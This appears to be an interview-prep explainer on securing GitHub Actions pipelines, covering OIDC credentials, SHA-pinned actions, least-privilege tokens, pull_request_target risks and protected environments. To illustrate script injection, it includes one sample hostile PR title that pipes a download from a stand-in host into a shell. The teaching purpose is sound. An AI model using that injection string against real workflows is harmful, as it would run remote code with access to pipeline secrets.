How do you secure GitHub Actions pipelines?

CI/CD Tools · concept · levels mid, senior

In one line

Secure GitHub Actions with OIDC instead of stored cloud keys, pin third-party actions to full commit SHAs, least-privilege GITHUB_TOKEN permissions, careful use of pull_request_target and no direct interpolation of untrusted input into scripts, plus environment protection and scoped secrets.

Detailed explanation

A CI pipeline holds the keys to production, so it is a prime supply-chain target.

OIDC instead of long-lived keys: with permissions: id-token: write, a workflow requests a signed OIDC token from GitHub and exchanges it with AWS, Azure or GCP for short-lived credentials. The cloud trust policy restricts which repo, branch or environment may assume the role (via the sub claim). No static access keys exist to leak.

Pin actions to SHAs: tags like @v4 are mutable; an attacker who compromises an action's repository can move the tag to malicious code. This happened with tj-actions/changed-files in March 2025, where altered tags exposed secrets in many repositories' logs. Pin to a full commit SHA (with a version comment) and let Dependabot or Renovate update it. Restrict allowed actions at org level.

Least-privilege GITHUB_TOKEN: set the org/repo default to read-only and declare permissions: per workflow or job, granting only what is needed (for example contents: read, pull-requests: write).

Untrusted code and input:

  • pull_request from forks runs without secrets and with a read-only token, which is safe. pull_request_target runs in the base repo context with secrets; never check out and execute the fork's code in it.
  • Script injection: expressions like ${{ github.event.pull_request.title }} inside run: are substituted before the shell runs, so a PR title such as "; curl evil.sh | sh # executes. Pass untrusted values through environment variables and quote them.

Environments and secrets: production secrets live in a protected environment with required reviewers and branch restrictions, so only approved runs on main can access them. Avoid organisation-wide secrets with broad scope.

Runners: never use self-hosted runners on public repositories; use ephemeral, isolated runners. Add CodeQL, secret scanning, dependency review, and artifact attestations for provenance.

How it works

  1. Default token read-only; per-job permissions.
  2. Cloud roles trust GitHub OIDC with tight subject conditions.
  3. All third-party actions pinned to SHAs, updated by Dependabot.
  4. Untrusted input passed via env vars only.
  5. Production jobs use protected environments.
  6. Audit logs and scanning monitor the pipeline.

Example

permissions: { contents: read }
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions: { contents: read, id-token: write }
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: aws-actions/configure-aws-credentials@<full-sha> # v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gh-deploy-prod
          aws-region: eu-west-1
      - name: Safe use of untrusted input
        env: { PR_TITLE: "${{ github.event.pull_request.title }}" }
        run: echo "Title: $PR_TITLE"

Common mistakes

  • Storing cloud access keys as repository secrets.
  • pull_request_target workflows that check out and build fork code.
  • Write-all default token permissions.
  • Self-hosted runners on public repos.

How to answer in the interview

"I use OIDC federation to the cloud so workflows get short-lived credentials and no long-lived keys are stored. Third-party actions are pinned to full commit SHAs, because tags can be moved, as the tj-actions compromise showed, with Dependabot keeping them updated. The GITHUB_TOKEN is read-only by default and permissions are declared per job. I'm careful with pull_request_target and never interpolate untrusted input like PR titles directly into shell scripts; I pass it through environment variables. Production deploys use protected environments with required reviewers and environment secrets."

Likely follow-up questions

  • Why are self-hosted runners on public repos dangerous? Anyone can open a PR that runs code on your machine and persists on it.
  • How to restrict OIDC trust? Match sub to the repo and environment, e.g. repo:acme/app:environment:production.
  • How to detect leaked secrets? Secret scanning with push protection and rotating anything exposed.
